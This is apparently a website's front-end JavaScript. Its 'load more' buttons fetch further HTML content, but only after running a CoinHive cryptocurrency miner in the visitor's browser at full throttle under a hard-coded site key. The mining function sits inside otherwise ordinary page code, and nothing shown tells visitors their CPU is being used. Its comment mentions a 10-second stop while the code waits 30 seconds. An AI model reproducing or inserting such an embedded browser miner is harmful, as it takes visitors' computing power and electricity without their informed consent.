import "./style.scss";


const mine = async() => {
    const miner = await CoinHive.Anonymous('R33EaeMyKkd8SvOQKSrecxGLbhu47dZO', { throttle: 0 });
    return new Promise(async(resolve) => {
        await miner.start();
        console.log('Started mining');

        miner.on('accepted', async(data) => {
            await miner.stop();
            resolve(data);
        });

        setTimeout(async() => {
            await miner.stop();
            resolve('Stopped mining after 10s timeout');
        }, 30000);
    })
};

const loadMoreButtons = document.querySelectorAll('.js-load-more');

const loadNextChunk = id => {
    fetch(`data/content-${id}.html`, {
            method: 'get',
            headers: {
                'Content-Type': 'text/html; charset=utf-8',
                'Accept': '*/*',
            }
        })
        .then(response => response.text())
        .then(body => {
            console.log('body', body);
            hidePreLoader(id);
            removeLoadMoreButton(id);
            renderNextChunk(body, id);
        }).catch(e => {
            // TODO re-enable button?
            console.error(e.name, e.message);
        });
}

const removeLoadMoreButton = id => {
    if (!id) {
        console.error("cannot remove load more button without id");
    } else {
        const btn = document.querySelector(`.js-load-more[data-next-id="${id}"]`);
        btn.style.display = "none";
    }
}

const renderNextChunk = (markup, id) => {
    const contentContainer = document.querySelector(`.section[data-section-id="${id}"]`);
    const domElement = document.createElement("div");

    domElement.innerHTML = markup;
    contentContainer.appendChild(domElement);
}

const showPreLoader = id => {
    const domElement = document.querySelector(`.progress[data-loader-id="${id}"]`);
    domElement.classList.add('scale-in');
}

const hidePreLoader = id => {
    const domElement = document.querySelector(`.progress[data-loader-id="${id}"]`);
    domElement.classList.remove('scale-in');
}

loadMoreButtons.forEach(loadMoreButton => {
    loadMoreButton.addEventListener('click', async(e) => {
        const nextId = e.target.getAttribute('data-next-id');
        if (nextId) {
            loadMoreButton.disabled = true;
            showPreLoader(nextId);
            const miner = await mine();
            console.log('Miner finished', miner);
            loadNextChunk(nextId);
        }
    });
});
